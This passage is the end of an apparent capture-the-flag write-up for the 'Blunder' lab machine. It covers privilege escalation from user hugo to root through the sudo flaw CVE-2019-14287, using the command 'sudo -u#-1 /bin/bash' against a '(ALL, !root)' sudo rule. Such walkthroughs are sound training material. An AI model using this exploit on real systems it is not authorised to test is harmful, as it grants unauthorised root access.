+hugo@blunder:~$ cat user.txt
+e0f8<span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>d3a5
+</code></pre></div><h2 id="4---post-exploitation-and-privilege-scalation">4 - Post-Exploitation and privilege scalation</h2>
+<p>This part is about how to get root as Hugo.</p>
+<p>I started checking the sudo permissions:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">hugo@blunder:/$ sudo -l
+
+Matching Defaults entries <span style="color:#66d9ef">for</span> hugo on blunder:
+    env_reset, mail_badpass,
+    secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin
+
+User hugo may run the following commands on blunder:
+    <span style="color:#f92672">(</span>ALL, !root<span style="color:#f92672">)</span> /bin/bash
+</code></pre></div><h3 id="cve-2019-14287-sudo">CVE-2019-14287 sudo</h3>
+<p>Inmediatly I recognised the flaw and CVE. For sudo 1.8.27</p>
+<p><a href="https://access.redhat.com/security/cve/cve-2019-14287">https://access.redhat.com/security/cve/cve-2019-14287</a></p>
+<p>This CVE was very famous because affected a huge number of Linux distributions and is too easy to exploit, because is not handling properly the target ID user when is an invalid user ID like -1, but is necessary to have a rule inside like this:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">(</span>ALL, !root<span style="color:#f92672">)</span> /usr/bin/somecommand
+</code></pre></div><h3 id="root-shell-and-flag">Root shell and flag</h3>
+<p>Great, because this time means that I can use the ID -1 to execute /bin/bash as root</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">hugo@blunder:/$ sudo -u#-1 /bin/bash
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@blunder:/# cat /root/root.txt
+bcb<span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>7d1
+</code></pre></div><p>Thanks for reading!</p>
+</div>
+
+  </article>
+</main>
+<footer>
+  <div>
+    <nav class="footer-menu"><a href="https://github.com/u915">GitHub</a><a href="https://www.linkedin.com/in/daniel-canomerchan">Linkedin</a><a href="/posts/index.xml">RSS</a><a href="/sitemap.xml">Sitemap</a></nav>
+    <div>© 2020 — u915 — <a href="/license/">License</a></div>
+  </div>
+</footer>
+</body>
+</html>
